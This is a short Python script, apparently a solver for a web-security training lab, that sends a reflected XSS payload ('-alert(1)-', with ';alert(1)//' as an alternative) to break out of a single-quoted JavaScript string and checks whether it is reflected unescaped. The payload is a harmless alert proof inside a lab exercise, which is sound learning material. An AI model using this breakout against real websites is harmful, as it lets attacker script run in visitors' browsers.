import argparse
import requests

# Reflected XSS into a JavaScript string with angle brackets HTML-encoded. The
# search term is reflected inside a single-quoted JS string in a <script> block.
# < and > are encoded (tags useless, and we're already inside a script), but ' is
# not - so we break out of the string and write JS directly. '-alert(1)-' closes
# the string, executes alert(1) via subtraction, and re-opens an empty string to
# stay syntactically valid. This script sends the payload and confirms the raw
# breakout is reflected; the alert executes in a browser on page load.

parser = argparse.ArgumentParser(description="Solve XSS lab 9 (reflected into JS string, angle brackets encoded)")
parser.add_argument("lab_url", help="Lab URL (https://0a...web-security-academy.net)")
parser.add_argument("--payload", default="'-alert(1)-'",
                    help="JS-string breakout payload (alt: \"';alert(1)//\")")
args = parser.parse_args()

lab_url = args.lab_url.rstrip("/")

# the payload breaks out of the single-quoted JS string; the server reflects it
# without encoding the quote, so it becomes live JavaScript.
resp = requests.get(lab_url + "/", params={"search": args.payload})

if args.payload in resp.text:
    print(f"[+] JS-string breakout reflected unescaped: {args.payload}")
    print("[+] alert(1) executes in a browser on page load.")
else:
    print("[!] Breakout not found verbatim; the quote may be escaped or the context differs.")

if "is-solved" in requests.get(lab_url + "/").text:
    print("[+] Lab solved!")
else:
    print(f"[!] Not marked solved yet - load {lab_url}/?search={args.payload} in a browser.")
